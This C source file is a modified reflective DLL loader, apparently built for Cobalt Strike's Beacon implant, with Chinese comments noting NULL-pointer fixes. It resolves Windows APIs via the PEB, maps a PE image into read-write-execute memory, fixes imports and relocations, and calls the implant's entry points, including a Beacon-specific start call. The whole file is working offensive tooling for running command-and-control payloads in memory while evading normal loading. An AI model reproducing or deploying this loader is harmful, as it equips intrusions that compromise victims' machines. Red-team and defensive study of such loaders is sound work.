//===============================================================================================//
// Fixed Reflective Loader - 修复版本
// 解决 NULL 指针引用和编码问题
//===============================================================================================//
#include "ReflectiveLoader.h"
#include "End.h"
#include "Utils.h"
#include "FunctionResolving.h"
#include "StdLib.h"
#include "BeaconUserData.h"
#include "TrackMemory.h"

// Uncomment this macro definition to use stephen fewer style approach
//#define _STEPHEN_FEWER

/**
 * The position independent reflective loader
 *
 * @return The target DLL's entry point
*/
extern "C" {
#pragma code_seg(".text$a")
    ULONG_PTR __cdecl ReflectiveLoader() {
        // STEP 0: Determine the start address of the loader
#ifdef _WIN64
        // A rip relative address is calculated in x64
        void* loaderStart = &ReflectiveLoader;
#elif _WIN32
        /*
        * &ReflectiveLoader does not work on x86, since it does not support eip relative addressing
        * Therefore, it is calculated by substracting the function prologue from the current address
        * This is subject to change depending upon the compiler/compiler settings. This could result
        * in issues with Beacon/the postex DLL's cleanup routines. As a result, when writing x86 loaders
        * we strongly recommend verifying that the correct value is subtracted from the result of 
        * GetLocation(). GetLocation() will return the address of the instruction following
        * the function call. In the example below, GetLocation() returns 0x0000000E which is why 
        * we subtract 0xE to get back to 0x0. In our testing, this value can change and can sometimes 
        * cause crashes during cleanup.
        * 
        * The generated disassembly from IDA:
        *
        * text:00000000                 push    ebp
        * text:00000001                 mov     ebp, esp
        * text:00000003                 sub     esp, 10h
        * text:00000006                 push    ebx
        * text:00000007                 push    esi
        * text:00000008                 push    edi
        * text:00000009                 call    GetLocation
        * text:0000000E                 mov     ebx, eax
        */
        void* loaderStart = (char*)GetLocation() - 0xE;
#endif
        PRINT("[+] Loader Base Address: %p\n", loaderStart);

        // STEP 1: Determine the base address of whatever we are loading
#ifdef _STEPHEN_FEWER
        ULONG_PTR rawDllBaseAddress = FindBufferBaseAddressStephenFewer();
#else
        ULONG_PTR rawDllBaseAddress = FindBufferBaseAddress();
#endif
        PRINT("[+] Raw DLL Base Address: %p\n", rawDllBaseAddress);

        // STEP 2: Determine the location of NtHeader
        PIMAGE_DOS_HEADER rawDllDosHeader = (PIMAGE_DOS_HEADER)rawDllBaseAddress;
        PIMAGE_NT_HEADERS rawDllNtHeader = (PIMAGE_NT_HEADERS)(rawDllBaseAddress + rawDllDosHeader->e_lfanew);

        // STEP 3: Resolve the functions our loader needs...
        _PPEB pebAddress = GetPEBAddress();
        WINDOWSAPIS winApi = { 0 };
        if (!ResolveBaseLoaderFunctions(pebAddress, &winApi)) {
            PRINT("[-] Failed to resolve base loader functions\n");
            return NULL;
        }

        // 验证关键函数是否解析成功
        if (!winApi.VirtualAlloc) {
            PRINT("[-] VirtualAlloc not resolved\n");
            return NULL;
        }
        if (!winApi.NtFlushInstructionCache) {
            PRINT("[-] NtFlushInstructionCache not resolved\n");
            return NULL;
        }

        // STEP 4: A simple PIC string example
        PIC_STRING(example, "[!] Hello, World!\n");
        PRINT(example);

        /**
        * STEP 5: Create a new location in memory for the loaded image...
        * We're using PAGE_EXECUTE_READWRITE as it's an example, but note - stage.userwx "true";
        */
        ULONG_PTR loadedDllBaseAddress = (ULONG_PTR)winApi.VirtualAlloc(NULL, rawDllNtHeader->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (loadedDllBaseAddress == NULL) {
            PRINT("[-] Failed to allocate memory. Exiting..\n");
            return NULL;
        }
        else {
            PRINT("[+] Allocated memory: 0x%p\n", loadedDllBaseAddress);
        }

        // STEP 6: Copy in our headers/sections...
        if (!CopyPEHeader(rawDllBaseAddress, loadedDllBaseAddress)) {
            PRINT("[-] Failed to copy PE header. Exiting..\n");
            return NULL;
        };
        if (!CopyPESections(rawDllBaseAddress, loadedDllBaseAddress)) {
            PRINT("[-] Failed to copy PE sections. Exiting..\n");
            return NULL;
        };

        // STEP 7: Process the target DLL's import table...
        ResolveImports(rawDllNtHeader, loadedDllBaseAddress, &winApi);

        // STEP 8: Process the target DLL's relocations...
        ProcessRelocations(rawDllNtHeader, loadedDllBaseAddress);

        // STEP 9: Find the target DLL's entry point
        ULONG_PTR entryPoint = loadedDllBaseAddress + rawDllNtHeader->OptionalHeader.AddressOfEntryPoint;
        PRINT("[+] Entry point: %p \n", entryPoint);

        /**
        * STEP 10: Call the target DLL's entry point
        * We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
        */
        winApi.NtFlushInstructionCache((HANDLE)-1, NULL, 0);

        // STEP 11: Call Beacon's entrypoint(s)
        PRINT("[*] Calling the entry point (DLL_PROCESS_ATTACH) \n");
        ((DLLMAIN)entryPoint)((HINSTANCE)loadedDllBaseAddress, DLL_PROCESS_ATTACH, NULL);
        PRINT("[*] Calling the entry point (DLL_BEACON_START) \n");
        ((DLLMAIN)entryPoint)((HINSTANCE)loaderStart, 0x4, NULL);

        // STEP 12: Return our new entry point address so whatever called us can call DllMain() if needed.
        return entryPoint;
    }
}

/*******************************************************************
 * To avoid problems with function positioning, do not add any new
 * functions above this pragma directive.
********************************************************************/
#pragma code_seg(".text$b")
